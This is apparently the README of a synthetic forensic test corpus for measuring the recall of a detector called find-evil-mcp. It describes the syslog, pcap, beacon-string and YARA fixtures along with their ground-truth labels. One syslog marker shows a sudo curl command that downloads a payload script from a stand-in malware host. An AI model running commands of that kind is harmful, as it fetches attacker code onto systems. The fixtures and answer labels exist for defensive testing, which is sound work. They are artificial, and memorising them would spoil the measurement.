# FIND EVIL Fixture Corpus

Ground-truth fixture set for `find-evil-mcp` detector accuracy measurement (recall ≥0.60 gate).

## License & Provenance

- **Synthetic fixtures**: CC0 (public domain) — hand-crafted on 2026-04-30, no third-party samples included.
- **YARA rules**: Apache 2.0 (see `cases/case-001/evidence/yara_rules/evil.yar`).
- **Data**: No real malware binaries included. All evidence is synthetic or placeholder-only.

## Directory Structure

```
find-evil-fixtures/
├── README.md                                    (this file)
├── checksums.txt                                (SHA-256 manifest)
└── cases/
    └── case-001/
        ├── manifest.json                        (ground-truth IOC labels)
        └── evidence/
            ├── syslog.log                       (50-line syslog, 3 evil markers)
            ├── payload.bin                      (256-byte Cobalt Strike beacon simulation)
            ├── sample.pcap                      (synthetic libpcap, 3 TCP flows)
            ├── memory.dmp                       (1 KB JSON placeholder)
            └── yara_rules/
                └── evil.yar                     (2 detection rules)
```

## Fixture Inventory

### case-001 (Synthetic Multi-Source Incident)

**Description**: Simulated incident combining network, log, and memory evidence.

**Evidence files**:
1. **syslog.log** (4.9 KB)
   - 50 lines of realistic syslog entries
   - Embedded markers:
     - `Failed password for invalid user root from 198.51.100.7 port 31337` (brute-force, line 2)
     - `sudo: eve : TTY=pts/0 ; USER=root ; COMMAND=/bin/curl http://malware.example/payload.sh` (suspicious command, line 5)
     - `kernel: hostile-driver-load: module=rootkit.ko sha256=deadbeef…` (kernel module, line 1)

2. **payload.bin** (256 bytes)
   - Contains literal string `"Cobalt Strike beacon_id=42 suspicious_beacon_payload"` followed by null bytes
   - Designed to trigger YARA rule `beacon_payload`

3. **sample.pcap** (234 bytes)
   - Synthetic libpcap format (magic: 0xa1b2c3d4)
   - 3 TCP SYN flows: 10.10.10.{10,11,12} → 203.0.113.{5,6,7}
   - Packet structure: Ethernet + IPv4 + TCP headers only (minimal size)

4. **memory.dmp** (1 KB)
   - Placeholder with JSON metadata: `{"_synthetic": true, "expected_pids": [4,200,1337], "malfind_pids": [1337]}`
   - Real Volatility3 parsing not required (Phase 2 fixture test uses mock)

5. **yara_rules/evil.yar** (432 bytes)
   - `rule beacon_payload`: detects "Cobalt Strike" OR "beacon_id="
   - `rule rootkit_marker`: detects "rootkit.ko"

**Ground-truth labels** (see `manifest.json`):
- `iocs.scan`: 2 expected matches (beacon_payload in payload.bin, rootkit_marker in syslog.log)
- `log.query`: 4 expected queries with hits (brute-force, rootkit.ko, curl, malware.example)
- `memory.process_list`: 3 processes (PIDs 4, 200, 1337)
- `memory.malfind`: 1 injected region (PID 1337)
- `net.flow_summary`: 3 flows

**Total expected findings**: 13

## Integration with SANS Samples (Future)

To add official SANS FIND EVIL samples:

1. Download from `sansorg.egnyte.com/fl/HhH7crTYT4JK` (requires registration).
2. Store in new subdirectory: `cases/case-00X/evidence/`.
3. Update `manifest.json` with ground-truth IOC labels from SANS scorecard.
4. Record SHA-256 hash in `checksums.txt` with provenance comment.
5. Add license header to case README if SANS license restricts redistribution.

Example:
```
# case-002-sans-sample.tar.gz
# Source: SANS FIND EVIL public dataset
# License: SANS evaluation license (non-commercial, forensics research only)
# Integrity: sha256 provided by SANS
```

## Verification

**Manifest validation**:
```bash
python3 -c "import json; json.load(open('cases/case-001/manifest.json'))"
```

**PCAP magic bytes** (libpcap verification):
```bash
xxd -l 4 cases/case-001/evidence/sample.pcap
# Expected: d4 c3 b2 a1 (little-endian) or a1 b2 c3 d4 (big-endian display)
```

**YARA rule syntax**:
```bash
yara -c cases/case-001/evidence/yara_rules/evil.yar cases/case-001/evidence/
```

**Total footprint**: < 5 MB

## Usage in find-evil-mcp

The orchestrator (`find-evil-mcp`) uses these fixtures to measure detection accuracy:

1. **Loader**: `case.open(image_path="/evidence/case-001/evidence/sample.pcap")` → case_id
2. **Scanner**: `iocs.scan(case_id, ruleset="yara_custom")` → matches array
3. **Verifier**: Compare matches against `manifest.json::expected_findings::iocs.scan`
4. **Metric**: recall = (matches found) / (expected_findings count)

Gate criterion (D-15 Phase 2): **recall ≥ 0.60** across all tools.

## Notes

- Fixtures are **NOT** for production incident response. They are PoC-only.
- No real malware or exploits included.
- Suitable for CI/CD testing (`make accuracy` in harness/).
- Extensible: new cases added under `cases/case-00X/`.
